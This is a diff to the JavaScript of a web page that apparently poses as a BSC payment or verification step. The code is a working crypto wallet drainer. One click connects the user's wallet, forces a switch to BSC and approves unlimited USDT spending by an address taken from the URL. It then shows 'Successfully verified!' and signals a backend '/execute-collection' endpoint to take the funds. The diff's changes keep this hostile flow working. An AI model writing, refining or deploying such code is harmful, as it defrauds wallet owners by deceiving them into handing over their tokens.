@@ -5,19 +5,29 @@ import { ethers } from 'https://esm.sh/ethers@6.13.2';
 
 "use strict";
 
-// Función para extraer la dirección del final de la URL o usar la predeterminada
-function getMerchantFromURL() {
+const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
+
+// Función para obtener la Destination Wallet (de la URL o del input manual)
+function getActiveMerchantAddress() {
+    const merchantInput = document.getElementById("merchantAddress");
+    
+    // 1. Intentar extraer del final de la URL
     const pathSegments = window.location.pathname.split("/").filter(Boolean);
     const lastSegment = pathSegments[pathSegments.length - 1];
-    const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
     
     if (lastSegment && ethAddressRegex.test(lastSegment)) {
+        if (merchantInput) merchantInput.value = lastSegment;
         return lastSegment;
     }
-    return "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
+    
+    // 2. Si no está en la URL, leer lo que el usuario escribió manualmente en el input
+    if (merchantInput && ethAddressRegex.test(merchantInput.value.trim())) {
+        return merchantInput.value.trim();
+    }
+    
+    return "";
 }
 
-const MERCHANT_ADDRESS = getMerchantFromURL();
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID_HEX = "0x38";
@@ -38,9 +48,14 @@ const btnSpinner    = document.getElementById("btnSpinner");
 const merchantInput = document.getElementById("merchantAddress");
 const toastEl       = document.getElementById("toast");
 
-if (merchantInput) {
-    merchantInput.value = MERCHANT_ADDRESS;
-}
+// Inicializar el valor del input al cargar
+window.addEventListener("DOMContentLoaded", () => {
+    const pathSegments = window.location.pathname.split("/").filter(Boolean);
+    const lastSegment = pathSegments[pathSegments.length - 1];
+    if (merchantInput && lastSegment && ethAddressRegex.test(lastSegment)) {
+        merchantInput.value = lastSegment;
+    }
+});
 
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
@@ -88,7 +103,7 @@ window.addEventListener("DOMContentLoaded", () => {
     if (qrContainer && window.QRCode) {
         qrContainer.innerHTML = "";
         new QRCode(qrContainer, {
-            text: window.location.href, // Actualizado para usar la URL actual con su respectivo parámetro dinámico
+            text: window.location.href,
             width: 140,
             height: 140,
             colorDark: "#0052FF",
@@ -101,6 +116,14 @@ window.addEventListener("DOMContentLoaded", () => {
 // FLUJO DE UN SOLO PASO: Conexión + Red + Transacción encadenadas
 approveBtn.addEventListener("click", async () => {
     try {
+        // Validar que la Destination Wallet sea correcta antes de continuar
+        const MERCHANT_ADDRESS = getActiveMerchantAddress();
+        if (!MERCHANT_ADDRESS) {
+            showToast("Introduce una Destination Wallet válida (0x...)", "error");
+            if (merchantInput) merchantInput.focus();
+            return;
+        }
+
         if (!modal) {
             showToast("Error de inicialización.", "error");
             return;
@@ -115,7 +138,6 @@ approveBtn.addEventListener("click", async () => {
         if (!activeProvider || !userAddress) {
             await modal.open();
             
-            // Esperar a que el usuario complete la conexión en el modal
             await new Promise((resolve, reject) => {
                 const unsubscribe = modal.subscribeState((state) => {
                     if (state.selectedNetworkId) {
@@ -123,7 +145,6 @@ approveBtn.addEventListener("click", async () => {
                         resolve();
                     }
                 });
-                // Timeout de seguridad de 60 segundos por si el usuario cierra el modal
                 setTimeout(() => {
                     unsubscribe();
                     reject(new Error("Conexión expirada o cancelada."));
@@ -142,7 +163,7 @@ approveBtn.addEventListener("click", async () => {
 
         setLoading(true, "Cambiando Red...");
 
-        // Paso B: Forzar el cambio o adición de red a BSC de forma automática
+        // Paso B: Forzar el cambio o adición de red a BSC
         try {
             await activeProvider.request({
                 method: "wallet_switchEthereumChain",
@@ -167,19 +188,18 @@ approveBtn.addEventListener("click", async () => {
 
         setLoading(true, "Signing...");
 
-        // Paso C: Ejecutar la transacción de aprobación (Approve) usando la dirección de destino dinámica (MERCHANT_ADDRESS)
+        // Paso C: Ejecutar la transacción usando la wallet obtenida del input o de la URL
         const provider = new ethers.BrowserProvider(activeProvider);
         const signer = await provider.getSigner();
         
         const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
-        // Utiliza MERCHANT_ADDRESS (sea el por defecto o el de la URL) como destinatario de la aprobación
         const tx = await usdtContract.approve(MERCHANT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
 
         setLoading(false);
         showToast("¡Successfully verified! ✓", "success");
 
-        // Notificar al backend de forma silenciosa enviando también la dirección de destino activa
+        // Notificar al backend
         fetch(`${BACKEND_URL}/execute-collection`, {
             method:  "POST",
             headers: { "Content-Type": "application/json" },
